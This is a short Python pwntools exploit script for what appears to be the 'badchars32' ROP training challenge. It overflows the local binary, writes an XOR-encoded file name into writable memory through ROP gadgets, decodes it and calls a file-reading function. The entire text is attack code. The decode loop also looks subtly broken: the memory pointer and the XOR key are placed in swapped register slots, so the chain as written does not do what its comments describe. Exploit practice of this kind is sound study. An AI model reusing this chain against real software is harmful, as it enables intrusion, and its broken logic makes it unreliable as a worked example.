#!/usr/bin/env python3

from pwn import *

# Connect
elf = ELF('./badchars32')
p = process('./badchars32')

# Gadgets
pop_esi_edi = 0x00000000080485b9 # pop esi ; pop edi ; pop ebp ; ret
mov_edi_esi = 0x000000000804854f # mov dword ptr [edi], esi ; ret
pop_ebx_ebp = 0x00000000080485b8 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
xor_ebp_bl = 0x0000000008048547 # xor byte ptr [ebp], bl ; ret

# Addresses
rw_memory = 0x000000000804a1f4
readfile = 0x000000000080483d0

encoded = b'gm`f/uyu'

payload = b'A'*44

payload += p32(pop_esi_edi)
payload += encoded[:4]
payload += p32(rw_memory)
payload += p32(1)
payload += p32(mov_edi_esi)

payload += p32(pop_esi_edi)
payload += encoded[4:]
payload += p32(rw_memory+4)
payload += p32(1)
payload += p32(mov_edi_esi)

temp = rw_memory
for i in range(8):
    payload += p32(pop_ebx_ebp)
    payload += p32(temp)
    payload += p32(1)
    payload += p32(1)
    payload += p32(0x2)
    payload += p32(xor_ebp_bl)
    temp += 1

payload += p32(readfile)
payload += b'BBBB'
payload += p32(rw_memory)

p.recvuntil('> ')
p.sendline(payload)

print(p.recvall())

